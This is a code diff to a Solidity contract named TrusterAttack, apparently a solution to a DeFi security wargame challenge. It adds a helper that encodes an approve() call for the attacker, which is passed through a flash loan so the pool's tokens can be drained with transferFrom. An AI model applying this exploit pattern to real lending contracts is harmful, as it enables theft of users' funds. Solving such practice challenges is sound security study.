@@ -13,4 +13,10 @@ contract TrusterAttack{
         TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
         IERC20(token).transferFrom(pool, msg.sender, amount);
     }
+
+    function attackData(uint256 amount, address attacker) public pure returns(bytes memory data){
+        bytes memory _data = abi.encodeWithSignature("approve(address,uint256)", attacker, amount);
+        return _data;
+    }
+
 }
